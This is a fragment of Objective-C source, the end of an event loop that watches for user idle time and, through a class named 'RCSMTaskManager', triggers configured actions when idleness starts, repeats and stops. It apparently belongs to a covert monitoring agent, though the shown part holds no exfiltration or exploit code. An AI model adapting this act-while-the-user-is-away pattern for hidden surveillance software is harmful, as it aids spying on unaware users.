  BOOL idleTriggered = FALSE;
  [configuration retain];
  
  UInt32 *seconds = (UInt32*)[[configuration objectForKey: @"data"] bytes];
  
  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
  int iter          = [[configuration objectForKey:@"iter"] intValue];
  int end           = [[configuration objectForKey:@"end"] intValue];
  
  int currentIter   = iter;
  
#ifdef DEBUG_EVENTS
  infoLog(@"%s: starting idle event every %lu sec", __FUNCTION__, *seconds);
#endif
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      amIInIdle = [self isInIdle: *seconds];
    
      if (amIInIdle == TRUE && idleTriggered == FALSE)
        {
          if ([self isEventEnable: configuration] == TRUE)
            {
#ifdef DEBUG_EVENTS
              infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
#endif
              idleTriggered = TRUE;
              [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
              currentIter = 0;
            }
        }
      
      if (amIInIdle == NO && idleTriggered == TRUE)
        {
          if ([self isEventEnable: configuration] == TRUE) 
            {
#ifdef DEBUG_EVENTS
              infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
#endif
              [[RCSMTaskManager sharedInstance] triggerAction: end];
              idleTriggered = FALSE;
            }
        }
    
      if (amIInIdle == TRUE)
        {
          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
              [self waitDelaySeconds:configuration] == FALSE &&
              [self isEventEnable: configuration] == TRUE)
            {
#ifdef DEBUG_EVENTS
              infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
#endif
              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
              currentIter++;
            }
        }
      
      sleep(1);
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
    [configuration setValue: EVENT_STOPPED forKey: @"status"];
    }
  
  [configuration release];
  [outerPool release];
  
  return;
}

@end
